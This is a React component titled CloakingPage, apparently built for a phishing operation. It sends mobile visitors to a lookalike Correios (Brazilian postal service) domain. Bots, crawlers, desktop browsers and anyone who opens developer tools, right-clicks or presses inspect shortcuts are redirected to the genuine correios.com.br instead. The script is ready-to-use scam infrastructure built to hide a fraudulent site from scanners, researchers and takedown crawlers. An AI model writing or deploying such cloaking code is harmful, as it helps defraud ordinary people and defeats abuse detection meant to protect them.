"use client"

import { useEffect } from "react"

export default function CloakingPage() {
  useEffect(() => {
    // ========== CONFIGURAÇÕES ==========
    const ORIGINAL_SITE = "https://destravaenvio.site/correios/" // SEU SITE ATUAL
    const DECOY_SITE = "https://correios.com.br" // SITE ALTERNATIVO
    // ===================================

    const detectDevTools = (): boolean => {
      const threshold = 160
      const widthThreshold = window.outerWidth - window.innerWidth > threshold
      const heightThreshold = window.outerHeight - window.innerHeight > threshold
      return widthThreshold || heightThreshold
    }

    const isMobile = (): boolean => {
      const userAgent = navigator.userAgent.toLowerCase()
      const mobileKeywords = ["android", "webos", "iphone", "ipad", "ipod", "blackberry", "windows phone", "mobile"]
      const isMobileUA = mobileKeywords.some((keyword) => userAgent.includes(keyword))
      const isMobileScreen = window.innerWidth <= 768
      return isMobileUA || isMobileScreen
    }

    const isBot = (): boolean => {
      const userAgent = navigator.userAgent.toLowerCase()
      const botKeywords = ["bot", "crawler", "spider", "scraper", "headless", "phantom", "selenium", "puppeteer", "playwright", "googlebot", "bingbot", "facebookexternalhit", "twitterbot", "linkedinbot", "slackbot"]
      return botKeywords.some((keyword) => userAgent.includes(keyword))
    }

    const redirect = () => {
      const mobile = isMobile()
      const devToolsOpen = detectDevTools()
      const bot = isBot()

      if (bot || !mobile || devToolsOpen) {
        window.location.replace(DECOY_SITE)
        return
      }

      window.location.replace(ORIGINAL_SITE)
    }

    const preventKeys = (e: KeyboardEvent) => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.shiftKey && e.keyCode === 74) || (e.ctrlKey && e.keyCode === 85)) {
        e.preventDefault()
        window.location.replace(DECOY_SITE)
      }
    }

    const preventRightClick = (e: MouseEvent) => {
      e.preventDefault()
      window.location.replace(DECOY_SITE)
    }

    const handleResize = () => {
      if (detectDevTools()) {
        window.location.replace(DECOY_SITE)
      }
    }

    document.addEventListener("keydown", preventKeys)
    document.addEventListener("contextmenu", preventRightClick)
    window.addEventListener("resize", handleResize)

    const timer = setTimeout(redirect, 100)
    const interval = setInterval(() => {
      if (detectDevTools()) {
        window.location.replace(DECOY_SITE)
      }
    }, 1000)

    return () => {
      clearTimeout(timer)
      clearInterval(interval)
      document.removeEventListener("keydown", preventKeys)
      document.removeEventListener("contextmenu", preventRightClick)
      window.removeEventListener("resize", handleResize)
    }
  }, [])

  return (
    <div className="fixed inset-0 bg-white flex items-center justify-center">
      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
    </div>
  )
}